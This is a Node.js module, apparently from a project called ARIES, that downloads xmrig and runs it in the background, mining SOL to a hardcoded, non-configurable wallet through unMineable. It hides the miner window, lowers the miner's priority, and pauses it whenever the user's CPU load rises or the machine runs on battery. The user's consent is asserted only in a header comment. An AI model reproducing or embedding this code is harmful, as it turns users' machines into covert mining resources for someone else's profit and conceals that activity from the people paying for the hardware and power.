/**
 * ARIES — Swarm Miner Client (Background Mining)
 * Auto-downloads xmrig, mines to Jay's wallet via unMineable.
 * Part of the swarm join — users contribute compute, get swarm AI access.
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const { spawn, execSync } = require('child_process');
const EventEmitter = require('events');

// HARDCODED — not configurable
const POOL = 'rx.unmineable.com:3333';
const COIN = 'SOL';
const WALLET = '59hXLWQ7RM47x44rn9bypJjzFCTnSGu3FukoM7q4ZhcbAricuuDiTyUc5A93BW9JdXurLvd6LuECJT4xxndtwY6a';
const REFERRAL = 'jdw-aries';
const MAX_CPU_PCT = 50;
const PAUSE_CPU_THRESHOLD = 60;

class SwarmMinerClient extends EventEmitter {
  constructor(opts = {}) {
    super();
    this._workerId = opts.workerId || 'aries-worker';
    this._dataDir = opts.dataDir || path.join(__dirname, '..', 'data', 'miner');
    this._process = null;
    this._running = false;
    this._paused = false;
    this._throttleTimer = null;
    this._stats = { hashrate: 0, accepted: 0, rejected: 0, startedAt: null };
  }

  async start() {
    if (this._running) return { ok: true, already: true };
    try {
      const xmrigPath = await this._ensureXmrig();
      this._startMiner(xmrigPath);
      this._startThrottleMonitor();
      this._running = true;
      this._stats.startedAt = Date.now();
      this.emit('started');
      return { ok: true };
    } catch (e) {
      this.emit('error', e.message);
      return { ok: false, error: e.message };
    }
  }

  stop() {
    if (this._process) {
      try { this._process.kill('SIGTERM'); } catch {}
      try { if (this._process.pid) process.kill(this._process.pid); } catch {}
      this._process = null;
    }
    if (this._throttleTimer) { clearInterval(this._throttleTimer); this._throttleTimer = null; }
    this._running = false;
    this._paused = false;
    this.emit('stopped');
    return { ok: true };
  }

  async _ensureXmrig() {
    if (!fs.existsSync(this._dataDir)) fs.mkdirSync(this._dataDir, { recursive: true });
    const ext = os.platform() === 'win32' ? '.exe' : '';
    const xmrigPath = path.join(this._dataDir, 'xmrig' + ext);
    if (fs.existsSync(xmrigPath)) return xmrigPath;

    this.emit('progress', { step: 'download', message: 'Downloading xmrig...' });
    const releaseInfo = await this._getLatestXmrigUrl();
    if (!releaseInfo) throw new Error('Could not find xmrig download');
    await this._downloadAndExtract(releaseInfo.url, releaseInfo.filename);
    if (!fs.existsSync(xmrigPath)) throw new Error('xmrig binary not found after extraction');
    if (os.platform() !== 'win32') { try { fs.chmodSync(xmrigPath, 0o755); } catch {} }
    return xmrigPath;
  }

  _getLatestXmrigUrl() {
    return new Promise((resolve) => {
      https.get({
        hostname: 'api.github.com', path: '/repos/xmrig/xmrig/releases/latest',
        headers: { 'User-Agent': 'ARIES-Swarm' }, timeout: 15000
      }, (res) => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => {
          try {
            const release = JSON.parse(data);
            const assets = release.assets || [];
            const platform = os.platform(), arch = os.arch();
            let keyword;
            if (platform === 'win32') keyword = 'msvc-win64';
            else if (platform === 'linux') keyword = arch === 'arm64' ? 'linux-arm' : 'linux-static-x64';
            else if (platform === 'darwin') keyword = 'macos-x64';
            else { resolve(null); return; }
            const asset = assets.find(a => a.name.includes(keyword) && (a.name.endsWith('.zip') || a.name.endsWith('.tar.gz')));
            resolve(asset ? { url: asset.browser_download_url, filename: asset.name } : null);
          } catch { resolve(null); }
        });
      }).on('error', () => resolve(null));
    });
  }

  async _downloadAndExtract(url, filename) {
    const tmpPath = path.join(this._dataDir, filename);
    await new Promise((resolve, reject) => {
      const download = (u) => {
        const mod = u.startsWith('https') ? https : http;
        mod.get(u, { headers: { 'User-Agent': 'ARIES-Swarm' }, timeout: 60000 }, (res) => {
          if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) { download(res.headers.location); return; }
          if (res.statusCode !== 200) { reject(new Error('Download failed: HTTP ' + res.statusCode)); return; }
          const file = fs.createWriteStream(tmpPath);
          res.pipe(file);
          file.on('finish', () => { file.close(); resolve(); });
        }).on('error', reject);
      };
      download(url);
    });

    try {
      if (filename.endsWith('.zip')) {
        if (os.platform() === 'win32') {
          execSync(`powershell -Command "Expand-Archive -Path '${tmpPath}' -DestinationPath '${this._dataDir}' -Force"`, { timeout: 30000 });
        } else {
          execSync(`unzip -o "${tmpPath}" -d "${this._dataDir}"`, { timeout: 30000 });
        }
      } else if (filename.endsWith('.tar.gz')) {
        execSync(`tar xzf "${tmpPath}" -C "${this._dataDir}"`, { timeout: 30000 });
      }

      // Move binary from extracted subfolder to dataDir root
      const ext = os.platform() === 'win32' ? '.exe' : '';
      const targetPath = path.join(this._dataDir, 'xmrig' + ext);
      if (!fs.existsSync(targetPath)) {
        const dirs = fs.readdirSync(this._dataDir).filter(f => fs.statSync(path.join(this._dataDir, f)).isDirectory());
        for (const dir of dirs) {
          const candidate = path.join(this._dataDir, dir, 'xmrig' + ext);
          if (fs.existsSync(candidate)) { fs.copyFileSync(candidate, targetPath); break; }
        }
      }
    } finally {
      try { fs.unlinkSync(tmpPath); } catch {}
    }
  }

  _startMiner(xmrigPath) {
    const user = `${COIN}:${WALLET}.${this._workerId}#${REFERRAL}`;
    const threads = Math.max(1, Math.floor(os.cpus().length * MAX_CPU_PCT / 100));
    const args = [
      '--url', POOL, '--user', user, '--pass', 'x',
      '--threads', String(threads), '--cpu-max-threads-hint', String(MAX_CPU_PCT),
      '--no-color', '--donate-level', '0'
    ];

    this._process = spawn(xmrigPath, args, {
      stdio: ['ignore', 'pipe', 'pipe'], detached: false, windowsHide: true
    });

    // Set low priority
    try {
      if (os.platform() === 'win32' && this._process.pid) {
        execSync(`wmic process where processid="${this._process.pid}" CALL setpriority "below normal"`, { stdio: 'pipe', timeout: 5000 });
      } else if (this._process.pid) {
        try { execSync(`renice 19 -p ${this._process.pid}`, { stdio: 'pipe', timeout: 3000 }); } catch {}
      }
    } catch {}

    const parseLine = (line) => {
      const hrMatch = line.match(/speed\s+\S+\s+([\d.]+)/);
      if (hrMatch) { this._stats.hashrate = parseFloat(hrMatch[1]); this.emit('hashrate', this._stats.hashrate); }
      const accMatch = line.match(/accepted\s+\((\d+)/);
      if (accMatch) this._stats.accepted = parseInt(accMatch[1]);
      const rejMatch = line.match(/rejected\s+\((\d+)/);
      if (rejMatch) this._stats.rejected = parseInt(rejMatch[1]);
    };

    this._process.stdout?.on('data', (d) => parseLine(d.toString()));
    this._process.stderr?.on('data', (d) => parseLine(d.toString()));
    this._process.on('exit', (code) => { this._running = false; this.emit('exited', { code }); });
  }

  _startThrottleMonitor() {
    if (this._throttleTimer) clearInterval(this._throttleTimer);
    let prevIdle = 0, prevTotal = 0;

    this._throttleTimer = setInterval(() => {
      if (!this._running || !this._process) return;
      const cpus = os.cpus();
      let idle = 0, total = 0;
      for (const cpu of cpus) { for (const t in cpu.times) total += cpu.times[t]; idle += cpu.times.idle; }
      const dI = idle - prevIdle, dT = total - prevTotal;
      prevIdle = idle; prevTotal = total;
      if (dT === 0) return;
      const usage = 100 - (dI / dT * 100);

      let onBattery = false;
      try {
        if (os.platform() === 'win32') {
          const out = execSync('WMIC Path Win32_Battery Get BatteryStatus', { timeout: 3000, encoding: 'utf8' });
          if (out.includes('1')) onBattery = true;
        }
      } catch {}

      if (usage > PAUSE_CPU_THRESHOLD || onBattery) {
        if (!this._paused) { this._paused = true; try { this._process.kill('SIGSTOP'); } catch {} this.emit('auto-paused', { reason: onBattery ? 'battery' : 'cpu' }); }
      } else {
        if (this._paused) { this._paused = false; try { this._process.kill('SIGCONT'); } catch {} this.emit('auto-resumed'); }
      }
    }, 5000);
  }

  getStats() {
    return {
      running: this._running, paused: this._paused,
      hashrate: this._stats.hashrate, accepted: this._stats.accepted, rejected: this._stats.rejected,
      uptime: this._stats.startedAt ? Math.floor((Date.now() - this._stats.startedAt) / 1000) : 0,
      pool: POOL, coin: COIN
    };
  }
}

module.exports = { SwarmMinerClient };
